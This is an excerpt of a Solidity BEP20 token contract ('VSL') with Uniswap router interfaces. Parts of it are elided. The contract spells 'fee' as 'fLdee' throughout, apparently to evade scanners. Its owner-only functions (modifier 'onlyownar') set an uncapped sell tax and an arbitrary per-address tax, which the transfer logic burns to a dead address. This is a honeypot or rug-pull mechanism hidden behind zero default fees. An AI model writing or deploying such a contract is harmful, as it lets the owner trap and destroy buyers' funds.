...
interface IUniswapV2Factory {
    ...
    function fLdeeTo() external view returns (address);
    function fLdeeToSetter() external view returns (address);
    ...
    function setfLdeeTo(address) external;
    function setfLdeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfLdeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfLdeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfLdeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfLdeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfLdeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract VSL is BEP20, Ownable {
    ...
    uint256 private _defaultSellfLdee = 0;

    uint256 private _defaultBuyfLdee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfLdee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfLdee = _value;
    }

    function setSlipfLdee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfLdee[_address] = _value;
    }

    function getSlipfLdee(address _address) external view onlyownar returns (uint256) {
        return _slipfLdee[_address];
    }


    function setMAccountfLdee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfLdee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefLdeeAmount = 0;

        if (rF) {
            uint256 tradefLdee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefLdee = _defaultSellfLdee;
                }
                if (from == uniswapV2Pair) {

                    tradefLdee = _defaultBuyfLdee;
                }
            }
            if (_slipfLdee[from] > 0) {
                tradefLdee = _slipfLdee[from];
            }

            tradefLdeeAmount = _Amount.mul(tradefLdee).div(100);
        }


        if (tradefLdeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradefLdeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefLdeeAmount);
            emit Transfer(from, _deadAddress, tradefLdeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefLdeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefLdeeAmount);
        emit Transfer(from, _to, _Amount - tradefLdeeAmount);
    }
